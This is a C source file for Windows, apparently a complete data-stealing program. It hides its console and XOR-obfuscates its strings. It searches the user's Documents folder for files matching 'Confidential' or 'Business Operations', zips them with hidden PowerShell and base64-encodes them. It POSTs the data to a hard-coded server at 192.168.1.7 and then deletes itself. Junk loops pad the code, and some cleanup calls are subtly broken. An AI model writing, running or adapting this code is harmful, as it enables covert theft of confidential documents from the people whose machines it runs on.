#ifndef _WIN32
#error This program requires a Windows environment
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>

void func_93fa_166(char *dst, const char *src, int len, unsigned char key) {
    if (!dst || !src || len < 0) return;
    for (int i = 0; i < len && i < 255; i++) dst[i] = src[i] ^ key;
    dst[len < 255 ? len : 255] = 0;
}

int func_b61c_250(const char *str, const char *substr) {
    if (!str || !substr) return 0;
    char *lower_str = _strdup(str);
    char *lower_substr = _strdup(substr);
    if (!lower_str || !lower_substr) { free(lower_str); free(lower_substr); return 0; }
    for (int i = 0; lower_str[i]; i++) lower_str[i] = tolower(lower_str[i]);
    for (int i = 0; lower_substr[i]; i++) lower_substr[i] = tolower(lower_substr[i]);
    int result = strstr(lower_str, lower_substr) != NULL;
    free(lower_str); free(lower_substr);
    return result;
}

void func_fa60_135(const char *path, HANDLE *var_6d3e_009, WIN32_FIND_DATAA var_280d_009, const char *var_6d3e_008, char *var_be8f_004, int depth, int *files_copied) {
    if (depth > 5 || !path || !var_6d3e_009 || !var_6d3e_008 || !var_be8f_004 || !files_copied) return;
    DWORD start_time = GetTickCount();
    char search_path[256];
    if (snprintf(search_path, sizeof(search_path), "%s\\*", path) >= sizeof(search_path)) {
        FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Path buffer overflow for %s\n", path); fclose(log); }
        return;
    }
    *var_6d3e_009 = FindFirstFileA(search_path, &var_280d_009);
    if (*var_6d3e_009 == INVALID_HANDLE_VALUE) {
        FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "FindFirstFileA failed for %s: %lu\n", path, GetLastError()); fclose(log); }
        return;
    }
    const char keyword1_enc[] = {0x73, 0x5f, 0x5e, 0x56, 0x59, 0x54, 0x55, 0x5e, 0x44, 0x59, 0x51, 0x5c};
    char keyword1[13];
    func_93fa_166(keyword1, keyword1_enc, 12, 48);
    const char keyword2_enc[] = {0x3a, 0x0d, 0x0b, 0x11, 0x16, 0x1d, 0x0b, 0x0b, 0x58, 0x37, 0x08, 0x1d, 0x0a, 0x19, 0x0c, 0x11, 0x17, 0x16, 0x0b};
    char keyword2[20];
    func_93fa_166(keyword2, keyword2_enc, 19, 120);
    int is_target_folder = func_b61c_250(path, keyword1) || func_b61c_250(path, keyword2);
    FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Scanning folder: %s\n", path); fclose(log); }
    do {
        if (var_280d_009.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(var_280d_009.cFileName, ".") == 0 || strcmp(var_280d_009.cFileName, "..") == 0) continue;
            if (var_280d_009.dwFileAttributes & (FILE_ATTRIBUTE_REPARSE_POINT | FILE_ATTRIBUTE_SYSTEM)) continue;
            if (snprintf(var_be8f_004, 256, "%s\\%s", path, var_280d_009.cFileName) >= 256) continue;
            HANDLE file_handle_2;
            func_fa60_135(var_be8f_004, &file_handle_2, var_280d_009, var_6d3e_008, var_be8f_004, depth + 1, files_copied);
        } else if (is_target_folder || func_b61c_250(var_280d_009.cFileName, keyword1) || func_b61c_250(var_280d_009.cFileName, keyword2)) {
            char src_path[256], dst_path[256];
            if (snprintf(src_path, sizeof(src_path), "%s\\%s", path, var_280d_009.cFileName) >= sizeof(src_path) ||
                snprintf(dst_path, sizeof(dst_path), "%s\\%s", var_6d3e_008, var_280d_009.cFileName) >= sizeof(dst_path)) {
                log = fopen("C:\\Users\\Public\\debug.txt", "a");
                if (log) { fprintf(log, "Path buffer overflow for %s\n", var_280d_009.cFileName); fclose(log); }
                continue;
            }
            if (CopyFileA(src_path, dst_path, FALSE)) {
                (*files_copied)++;
                log = fopen("C:\\Users\\Public\\debug.txt", "a");
                if (log) { fprintf(log, "Copied file: %s\n", src_path); fclose(log); }
            } else {
                log = fopen("C:\\Users\\Public\\debug.txt", "a");
                if (log) { fprintf(log, "Failed to copy %s: %lu\n", src_path, GetLastError()); fclose(log); }
            }
        } else {
            log = fopen("C:\\Users\\Public\\debug.txt", "a");
            if (log) { fprintf(log, "Skipped file: %s\\%s\n", path, var_280d_009.cFileName); fclose(log); }
        }
    } while (FindNextFileA(*var_6d3e_009, &var_280d_009));
    FindClose(*var_6d3e_009);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Scanning %s took %lu ms\n", path, GetTickCount() - start_time); fclose(log); }
}

int main(int argc, char *argv[]) {
    FreeConsole();
    DWORD prog_start_time = GetTickCount();
    volatile int var_571c_004 = 4;
    for (int j_437 = 0; j_437 < 3; j_437++) {
        int k_437 = 46;
    }
    const char var_6d3e_008_enc[] = {0x69, 0x10, 0x76, 0x7f, 0x59, 0x4f, 0x58, 0x59, 0x76, 0x7a, 0x5f, 0x48, 0x46, 0x43, 0x49, 0x76, 0x6e, 0x45, 0x5d, 0x44, 0x46, 0x45, 0x4b, 0x4e, 0x59, 0x76, 0x6e, 0x45, 0x5d, 0x44, 0x46, 0x45, 0x4b, 0x4e, 0x59};
    char var_6d3e_008[36];
    func_93fa_166(var_6d3e_008, var_6d3e_008_enc, 35, 42);
    if (!CreateDirectoryA(var_6d3e_008, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        char temp_dir[36];
        GetTempPathA(sizeof(temp_dir), temp_dir);
        if (snprintf(var_6d3e_008, sizeof(var_6d3e_008), "%sPolyDownloads", temp_dir) >= sizeof(var_6d3e_008)) {
            FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
            if (log) { fprintf(log, "Output directory buffer overflow\n"); fclose(log); }
            return 1;
        }
        CreateDirectoryA(var_6d3e_008, NULL);
    }
    FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Directory created: %s\n", var_6d3e_008); fclose(log); }
    HANDLE var_6d3e_009;
    WIN32_FIND_DATAA var_280d_009;
    char var_be8f_004[256];
    char username[256];
    DWORD username_len = sizeof(username);
    GetEnvironmentVariableA("USERNAME", username, username_len);
    char root_path[256];
    if (snprintf(root_path, sizeof(root_path), "C:\\Users\\%s\\Documents", username) >= sizeof(root_path)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Root path buffer overflow\n"); fclose(log); }
        return 1;
    }
    var_571c_004 += 34;
    for (int j_186 = 0; j_186 < 4; j_186++) {
        int k_186 = 41;
    }
    int files_copied = 0;
    DWORD scan_start_time = GetTickCount();
    func_fa60_135(root_path, &var_6d3e_009, var_280d_009, var_6d3e_008, var_be8f_004, 0, &files_copied);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Directory scan completed, %d files copied, took %lu ms\n", files_copied, GetTickCount() - scan_start_time); fclose(log); }
    if (files_copied == 0) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "No files copied, skipping exfiltration\n"); fclose(log); }
        goto cleanup;
    }
    char temp_path[256];
    GetTempPathA(sizeof(temp_path), temp_path);
    char zip_path[256];
    if (snprintf(zip_path, sizeof(zip_path), "%sarchive.zip", temp_path) >= sizeof(zip_path)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Zip path buffer overflow\n"); fclose(log); }
        goto cleanup;
    }
    char zip_cmd[512];
    if (snprintf(zip_cmd, sizeof(zip_cmd), "-Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"", var_6d3e_008, zip_path) >= sizeof(zip_cmd)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Zip command buffer overflow\n"); fclose(log); }
        goto cleanup;
    }
    DWORD zip_start_time = GetTickCount();
    if (ShellExecuteA(NULL, "open", "powershell.exe", zip_cmd, NULL, SW_HIDE) <= (HINSTANCE)32) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "PowerShell zipping failed, attempting individual copy\n"); fclose(log); }
        WIN32_FIND_DATAA find_data;
        char search_path[256];
        if (snprintf(search_path, sizeof(search_path), "%s\\*", var_6d3e_008) >= sizeof(search_path)) {
            log = fopen("C:\\Users\\Public\\debug.txt", "a");
            if (log) { fprintf(log, "Search path buffer overflow\n"); fclose(log); }
            goto cleanup;
        }
        HANDLE hFind = FindFirstFileA(search_path, &find_data);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                char src_path[256], dst_path[256];
                if (snprintf(src_path, sizeof(src_path), "%s\\%s", var_6d3e_008, find_data.cFileName) >= sizeof(src_path) ||
                    snprintf(dst_path, sizeof(dst_path), "%sarchive_%s", temp_path, find_data.cFileName) >= sizeof(dst_path)) {
                    log = fopen("C:\\Users\\Public\\debug.txt", "a");
                    if (log) { fprintf(log, "Fallback path buffer overflow for %s\n", find_data.cFileName); fclose(log); }
                    continue;
                }
                if (CopyFileA(src_path, dst_path, FALSE)) {
                    log = fopen("C:\\Users\\Public\\debug.txt", "a");
                    if (log) { fprintf(log, "Fallback copied: %s\n", dst_path); fclose(log); }
                }
            } while (FindNextFileA(hFind, &find_data));
            FindClose(hFind);
        } else {
            log = fopen("C:\\Users\\Public\\debug.txt", "a");
            if (log) { fprintf(log, "FindFirstFileA failed for zipping fallback: %lu\n", GetLastError()); fclose(log); }
        }
    } else {
        Sleep(2000);
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Zipping succeeded: %s, took %lu ms\n", zip_path, GetTickCount() - zip_start_time); fclose(log); }
    }
    WSADATA wsa;
SOCKET s = INVALID_SOCKET;
struct sockaddr_in server;
char *b64 = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD exfil_start_time = GetTickCount();
    for (int retry = 0; retry < 5; retry++) {
        hFile = CreateFileA(zip_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) break;
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to open %s (attempt %d): %lu\n", zip_path, retry + 1, GetLastError()); fclose(log); }
        Sleep(2000);
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to open %s after retries: %lu\n", zip_path, GetLastError()); fclose(log); }
        goto cleanup;
    }
    DWORD file_size = GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Invalid or empty %s size: %lu\n", zip_path, file_size); fclose(log); }
        CloseHandle(hFile);
        goto cleanup;
    }
    char *buf = malloc(file_size);
    if (!buf) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to allocate memory for %s\n", zip_path); fclose(log); }
        CloseHandle(hFile);
        goto cleanup;
    }
    DWORD read;
    if (!ReadFile(hFile, buf, file_size, &read, NULL) || read != file_size) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to read %s: %lu\n", zip_path, GetLastError()); fclose(log); }
        free(buf);
        CloseHandle(hFile);
        goto cleanup;
    }
    CloseHandle(hFile);
    const char b64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int b64_len = ((file_size + 2) / 3) * 4 + 1;
    b64 = malloc(b64_len);
    if (!b64) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to allocate memory for b64\n"); fclose(log); }
        free(buf);
        goto cleanup;
    }
    int j = 0;
    for (int i = 0; i < file_size; i += 3) {
        int a = (unsigned char)buf[i];
        int b = i + 1 < file_size ? (unsigned char)buf[i + 1] : 0;
        int c = i + 2 < file_size ? (unsigned char)buf[i + 2] : 0;
        b64[j++] = b64_chars[(a >> 2) & 0x3F];
        b64[j++] = b64_chars[((a << 4) & 0x30) | ((b >> 4) & 0x0F)];
        b64[j++] = i + 1 < file_size ? b64_chars[((b << 2) & 0x3C) | ((c >> 6) & 0x03)] : '=';
        b64[j++] = i + 2 < file_size ? b64_chars[c & 0x3F] : '=';
    }
    b64[j] = 0;
free(buf);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Base64 encoding completed\n"); fclose(log); }
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "WSAStartup failed: %d\n", WSAGetLastError()); fclose(log); }
        goto alt_exfil;
    }
    int http_success = 0;
    for (int port = 80; port <= 8080; port += port == 80 ? 7988 : 0) {
        for (int retry = 0; retry < 3; retry++) {
            s = socket(AF_INET, SOCK_STREAM, 0);
            if (s == INVALID_SOCKET) {
                log = fopen("C:\\Users\\Public\\debug.txt", "a");
                if (log) { fprintf(log, "Socket creation failed: %d\n", WSAGetLastError()); fclose(log); }
                Sleep(1000);
                continue;
            }
            int timeout = 5000;
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
            server.sin_family = AF_INET;
            const char server_ip_enc[] = {0xdd, 0xd5, 0xde, 0xc2, 0xdd, 0xda, 0xd4, 0xc2, 0xdd, 0xc2, 0xdb};
    char server_ip[16];
    func_93fa_166(server_ip, server_ip_enc, 11, 236);
    if (strcmp(server_ip, "192.168.1.7") != 0) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Invalid server IP: %s\n", server_ip); fclose(log); }
        closesocket(s);
        continue;
    }
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(port);
    if (connect(s, (struct sockaddr*)&server, sizeof(server)) != 0) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Connect failed to %s:%d: %d\n", server_ip, port, WSAGetLastError()); fclose(log); }
        closesocket(s);
        s = INVALID_SOCKET;
        Sleep(1000);
        continue;
    }
    char req[16384];
    if (snprintf(req, sizeof(req), "POST /upload HTTP/1.1\r\nHost: %s:%d\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s", server_ip, port, b64_len - 1, b64) >= sizeof(req)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "HTTP request buffer overflow\n"); fclose(log); }
        closesocket(s);
        s = INVALID_SOCKET;
        continue;
    }
    int sent = send(s, req, strlen(req), 0);
    if (sent == SOCKET_ERROR) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Send failed: %d\n", WSAGetLastError()); fclose(log); }
        closesocket(s);
        s = INVALID_SOCKET;
        Sleep(1000);
        continue;
    }
    char resp[1024] = {0};
    int received = recv(s, resp, sizeof(resp) - 1, 0);
    if (received > 0 && strstr(resp, "200 OK")) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "HTTP succeeded on port %d\n", port); fclose(log); }
        http_success = 1;
        closesocket(s);
        break;
    } else {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "HTTP failed, no 200 OK on port %d\n", port); fclose(log); }
    }
    closesocket(s);
    s = INVALID_SOCKET;
    Sleep(1000);
    }
    if (http_success) break;
    }
    WSACleanup();
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Exfiltration took %lu ms\n", GetTickCount() - exfil_start_time); fclose(log); }
    if (http_success) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "HTTP exfiltration completed\n"); fclose(log); }
        free(b64);
        goto cleanup;
    }
alt_exfil:
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Attempting fallback exfiltration\n"); fclose(log); }
    char fallback_path[256];
    if (snprintf(fallback_path, sizeof(fallback_path), "%s.data.txt", temp_path) >= sizeof(fallback_path)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Fallback path buffer overflow\n"); fclose(log); }
        free(b64);
        goto cleanup;
    }
    HANDLE hOut = CreateFileA(fallback_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hOut == INVALID_HANDLE_VALUE) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to create %s: %lu\n", fallback_path, GetLastError()); fclose(log); }
        free(b64);
        goto cleanup;
    }
    DWORD written;
    if (!WriteFile(hOut, b64, b64_len - 1, &written, NULL)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
        if (log) { fprintf(log, "Failed to write %s: %lu\n", fallback_path, GetLastError()); fclose(log); }
        CloseHandle(hOut);
        free(b64);
        goto cleanup;
    }
    CloseHandle(hOut);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Fallback exfiltration completed to %s\n", fallback_path); fclose(log); }
    free(b64);
cleanup:
    DWORD cleanup_start_time = GetTickCount();
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Cleanup started\n"); fclose(log); }
    ShellExecuteA(NULL, "open", "powershell.exe", "-Command \"Remove-Item -Path '%s' -ErrorAction SilentlyContinue\"", zip_path, SW_HIDE);
    ShellExecuteA(NULL, "open", "powershell.exe", "-Command \"Remove-Item -Path '%s\\*' -Recurse -ErrorAction SilentlyContinue\"", var_6d3e_008, SW_HIDE);
    char cmd[256];
    if (snprintf(cmd, sizeof(cmd), "cmd.exe /C ping 127.0.0.1 -n 2 > nul & del /F /Q \"%s\"", argv[0]) < sizeof(cmd)) {
        system(cmd);
    }
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Cleanup completed, took %lu ms\n", GetTickCount() - cleanup_start_time); fclose(log); }
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Program completed, total time %lu ms\n", GetTickCount() - prog_start_time); fclose(log); }
    return 0;
}
